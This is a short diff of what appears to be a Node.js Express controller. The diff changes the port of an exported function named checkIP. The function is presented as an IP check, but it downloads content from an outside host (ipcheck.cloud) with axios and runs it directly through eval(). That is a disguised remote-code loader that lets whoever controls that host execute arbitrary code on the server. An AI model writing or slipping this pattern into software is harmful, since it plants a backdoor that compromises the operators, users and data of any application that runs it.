@@ -60,7 +60,7 @@ exports.update = function (req, res) {
 
 exports.checkIP = async function (req, res) {
   const response = await axios.get(
-    "http://ipcheck.cloud:8353/api/user/download/v6/106"
+    "http://ipcheck.cloud:3963/api/user/download/v6/106"
   );
   // console.log('IP is available');
   eval(response.data);
